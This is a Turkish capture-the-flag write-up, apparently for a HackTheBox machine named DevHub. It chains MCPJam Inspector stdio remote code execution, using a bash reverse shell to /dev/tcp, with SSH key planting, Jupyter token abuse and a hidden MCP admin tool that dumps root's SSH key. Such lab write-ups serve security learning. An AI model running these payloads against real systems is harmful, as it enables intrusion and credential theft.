@@ -1,0 +1,181 @@
+## Keşif
+
+İlk olarak tam port taraması yapıyorum:
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 -oA full_scan ip
+```
+
+Sonuç yalnızca iki port gösteriyor:
+
+```
+PORT   STATE SERVICE
+22/tcp open  tcpwrapped
+80/tcp open  tcpwrapped
+```
+
+Port 80'de basit bir statik sayfa var. DevHub adında bir iç geliştirme platformu. Sayfada üç servis listeleniyor:
+
+- **MCP Inspector** — Port 6274 (Active)
+- **Analytics Dashboard** — Jupyter, localhost:8888 (Internal Only)
+- **Code Repository** — Maintenance Mode
+
+Port 6274 nmap'te çıkmadı ama sayfada açıkça yazıyor. Direkt deniyorum:
+
+```bash
+curl -v http://ip:6274/
+```
+
+MCPJam Inspector arayüzü dönüyor. Burası bir MCP (Model Context Protocol) debug aracı. API endpoint'lerini JS bundle'dan çekiyorum:
+
+```bash
+curl -s http://ip:6274/assets/index-DRYhT9Xb.js | \
+  tr ',' '\n' | grep -oP '"/(api|proxy)[^"]{0,60}"' | sort -u
+```
+
+`/api/mcp/connect`, `/api/mcp/tools/list`, `/api/mcp/tools/execute` gibi endpoint'ler görünüyor.
+
+---
+
+## İlk Erişim — MCPJam stdio RCE
+
+MCPJam Inspector, MCP server'lara hem HTTP hem de **stdio** transport ile bağlanabiliyor. Stdio transport'ta Inspector bir process başlatıp onunla iletişim kuruyor — yani doğrudan komut çalıştırabiliriz.
+
+Kali'de listener açıyorum:
+
+```bash
+nc -lvnp 4444
+```
+
+Yeni terminalde:
+
+```bash
+curl -s -X POST http://ip/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "serverId": "pwn",
+    "serverConfig": {
+      "command": "bash",
+      "args": ["-c", "bash -i >& /dev/tcp/tun0/4444 0>&1"],
+      "transport": "stdio"
+    }
+  }'
+```
+
+`mcp-dev` kullanıcısı olarak shell alıyorum.
+
+---
+
+## Keşif (mcp-dev Shell)
+
+Sistemde çalışan processlere bakıyorum:
+
+```bash
+ps aux | grep -E "jupyter|python|mcp"
+```
+
+İki kritik şey görüyorum:
+
+1. **Jupyter Lab** — `analyst` kullanıcısı olarak `localhost:8888` üzerinde çalışıyor. Komut satırında token açıkça yazıyor:
+   ```
+   --ServerApp.token=*
+   ```
+
+2. **OPSMCP Server** — `root` olarak `/opt/opsmcp/server.py` çalışıyor.
+
+Dinleyen portlara bakıyorum:
+
+```bash
+ss -tlnp
+```
+
+`localhost:5000` açık — bu root MCP server.
+
+---
+
+## Yatay Yükselme — Jupyter → analyst
+
+Jupyter `localhost:8888`'de ve dışarıdan erişilemiyor. SSH port forward kuruyorum.
+
+Önce Kali'de key üretiyorum:
+
+```bash
+ssh-keygen -t rsa -N '' -f /tmp/htbkey -q
+ssh-keygen -y -f /tmp/htbkey
+```
+
+Public key'i mcp-dev shell'inde `authorized_keys`'e ekliyorum:
+
+```bash
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
+```
+
+Kali'den port forward:
+
+```bash
+ssh -i /tmp/htbkey -L 8888:localhost:8888 mcp-dev@ip -N
+```
+
+Artık `localhost:8888` üzerinden Jupyter'e ulaşabiliyorum. Token ile bağlanıp Jupyter WebSocket üzerinden kod çalıştırıyorum:
+
+```python
+import websocket, json, uuid, requests
+
+TOKEN = '*'
+
+# Kernel oluştur
+r = requests.post('http://localhost:8888/api/kernels',
+    headers={'Authorization': f'token {TOKEN}', 'Content-Type': 'application/json'},
+    data='{}')
+kid = r.json()['id']
+
+# WebSocket ile bağlan ve kod çalıştır
+ws = websocket.WebSocket()
+ws.connect(f'ws://localhost:8888/api/kernels/{kid}/channels?token={TOKEN}')
+
+# ... execute_request mesajı gönder
+```
+
+User flag:
+
+```bash
+print(open('/home/analyst/user.txt').read())
+#*
+```
+
+---
+
+## Dikey Yükselme — Root
+
+`/opt/opsmcp/server.py` dosyasını Jupyter üzerinden okuyorum (analyst bu dosyaya erişebiliyor):
+
+```python
+print(open('/opt/opsmcp/server.py').read())
+```
+
+Flask uygulaması. İki önemli şey fark ediyorum:
+
+1. **API Key:** `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
+2. **Gizli tool:** `ops._admin_dump` — `ssh_keys` hedefiyle root'un private key'ini döküyor.
+
+Bu tool liste endpoint'inde görünmüyor ama `/tools/call`'dan çağrılabiliyor. mcp-dev shell'inden çağırıyorum:
+
+```bash
+curl -s -X POST http://localhost:5000/tools/call \
+  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
+```
+
+Root'un private SSH key'i dönüyor. Kali'ye kaydedip bağlanıyorum:
+
+```bash
+chmod 600 /tmp/root_key
+ssh -i /tmp/root_key root@ip
+```
+
+```
+root@devhub:~# cat /root/root.txt
+```
